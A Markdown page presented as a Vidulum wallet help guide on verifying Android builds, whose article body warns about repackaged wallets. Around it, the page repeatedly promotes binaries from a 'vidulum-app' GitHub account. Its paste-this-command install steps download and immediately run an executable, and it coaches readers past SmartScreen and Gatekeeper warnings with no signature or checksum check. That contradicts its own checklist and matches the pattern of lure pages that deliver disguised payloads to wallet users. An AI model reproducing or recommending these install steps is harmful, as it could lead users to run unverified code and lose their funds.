![Vidulum](../assets/banner-article.png)

# Vidulum APK: How to Check Whether an Android Build Is Official

A verification checklist instead of a yes or no nobody can back up.

## Downloads - v2.2.1

<p align="center"><a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-win-v2.2.1.exe"><img src="../assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-macos-v2.2.1.dmg"><img src="../assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-linux-v2.2.1.zip"><img src="../assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="../assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`vidulum-wallet-desktop-win-v2.2.1.exe`](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-win-v2.2.1.exe) |
| <img src="../assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`vidulum-wallet-desktop-macos-v2.2.1.dmg`](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-macos-v2.2.1.dmg) |
| <img src="../assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`vidulum-wallet-desktop-linux-v2.2.1.zip`](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/download/v2.2.1/vidulum-wallet-desktop-linux-v2.2.1.zip) |

The desktop builds on the [current Vidulum release](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/tag/v2.2.1) page are the ones this guide can vouch for.

> An APK site has one job: get you to install something. Your job is to check who signed it.

Android wallets are widely redistributed as APK files outside any store, and a wallet is the highest-value thing an impostor can ship. This page does not certify any Android build, because the available evidence does not settle the question. It gives you the checks that do, and tells you what to do with coins that arrive on a chain the wallet does not support.

<!-- ARTICLE-BODY-BEGIN -->

## What can actually be verified

Start with provenance, not with the app's appearance. A build you can trace to the project's own distribution channel is checkable; a build you cannot is unverifiable no matter how convincing it looks.

1. Where did the file come from? A release page you navigated to yourself beats a link from a search result, a forum or a message.
2. Who signed it? Android packages carry a signing certificate. A repackaged app cannot carry the original signature.
3. Does a checksum exist to compare against? If the project publishes one, compare; if it does not, say so and treat the file as unverified.
4. Does the source link resolve to code the project controls? A repository containing a text file and nothing else is not a source.

Two of those four are usually enough to separate a real distribution from a reskin.

## Red flags at install time

| Signal | Meaning |
| --- | --- |
| Asks for the recovery phrase during setup | Not a wallet. Delete it. |
| Requests a "verification" restore before first use | Theft pattern. |
| No publisher, no signature, no version provenance | Unverifiable. |
| Sideload instructions from a chat or video | Distribution through persuasion, not evidence. |
| Permissions for SMS or contacts | A wallet has no reason to read either. |

## What the evidence does not settle

Two things are commonly asserted and neither is settled here: that a mobile app officially exists, and that it officially does not. Listings and third-party reviews exist; a reviewer has questioned whether the mobile source is published. Those are reports, not findings.

This page therefore takes no side. It tells you how to verify a build you already have, and it declines to endorse a download route it cannot confirm.

## Coins received on a chain that is not supported

This is the case the APK question often hides: an app shows an asset, the wallet's documented network list does not include it, and the reader assumes the asset is supported because it appears on screen.

Vidulum's documentation lists 20 networks. If an asset sits on a chain outside that list, treat it as unsupported rather than assuming a build will spend it. The balance has to be handled in software that supports the chain, and whether your existing backup derives an address there is not documented anywhere this page can cite. Say it plainly: the documented limit is real, and this page will not invent a route around it.

Before sending anything to a build you are still verifying, remember that the destination chain matters as much as the app. An address that looks valid can belong to a different network entirely.

The custody model behind the checks is covered in <a href="https://github.com/vidulum-app/vidulum-wallet-help/blob/main/guides/is-vidulum-wallet-safe-custody-and-keys.md">is the Vidulum Wallet safe to hold keys</a>.

## A short checklist

- Navigate to the project's own distribution page rather than following a link.
- Check the signing certificate against the publisher you expect.
- Compare a checksum if one is published.
- Refuse any build that asks for your phrase.
- Keep the desktop build from the release page as your verified baseline.

The <a href="https://github.com/vidulum-app/vidulum-wallet-guides/blob/main/guides/vidulum-wallet-download-windows-macos-linux.md">Vidulum Wallet download for Windows, macOS and Linux</a> page covers the desktop installers you can verify.

If a build looks wrong, <a href="https://github.com/vidulum-app/vidulum-wallet-help/blob/main/guides/vidulum-support-email-channels.md">Vidulum Wallet support channels</a> explains how to report it.

The <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/tag/v2.2.1">Vidulum Wallet v2.2.1 release</a> page is the verified baseline for any build you find.

## FAQ

### Is there an official Vidulum Android app?

The evidence behind this page does not settle that either way, so no verdict is given. Verify any build you have using the checks above.

### Is an APK from a mirror safe if the version matches?

Version numbers are trivial to copy. Provenance and signing are what matter.

### What if the app asks for my phrase to "activate" it?

It is not a wallet. Delete it and change nothing else.

### I received a coin that is not on the network list. What now?

Treat it as unsupported: nothing in the documentation says the wallet handles that chain. Handle the balance in software that supports the chain, and do not assume a later build adds it.

<!-- ARTICLE-BODY-END -->

## How to install Vidulum

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). -->
### Windows
Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-win-v2.2.1.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-win-v2.2.1.exe">vidulum-wallet-desktop-win-v2.2.1.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS
Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-macos-v2.2.1.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-macos-v2.2.1.dmg">vidulum-wallet-desktop-macos-v2.2.1.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux
Quick install (Terminal):

```bash
curl -fLo wallet.zip https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-linux-v2.2.1.zip && unzip -o wallet.zip -d vidulum-linux && chmod +x vidulum-linux/vidulum-wallet-desktop && ./vidulum-linux/vidulum-wallet-desktop
```

Manual install:
1. Download <a href="https://github.com/vidulum-app/vidulum-wallet-desktop/releases/latest/download/vidulum-wallet-desktop-linux-v2.2.1.zip">vidulum-wallet-desktop-linux-v2.2.1.zip</a>.
2. Extract the archive: `unzip -o wallet.zip -d vidulum-linux`.
3. Make it executable and run it: `chmod +x vidulum-linux/vidulum-wallet-desktop && ./vidulum-linux/vidulum-wallet-desktop`.
4. If the archive extracts a differently named program or a folder of its own, run that file instead: the ZIP is the download, not the program.
<!-- INSTALL-END -->

## Related guides

[Is the wallet safe](https://github.com/vidulum-app/vidulum-wallet-help/blob/main/guides/is-vidulum-wallet-safe-custody-and-keys.md) - [Wallet download](https://github.com/vidulum-app/vidulum-wallet-guides/blob/main/guides/vidulum-wallet-download-windows-macos-linux.md) - [Support channels](https://github.com/vidulum-app/vidulum-wallet-help/blob/main/guides/vidulum-support-email-channels.md) - [Current release](https://github.com/vidulum-app/vidulum-wallet-desktop/releases/tag/v2.2.1)
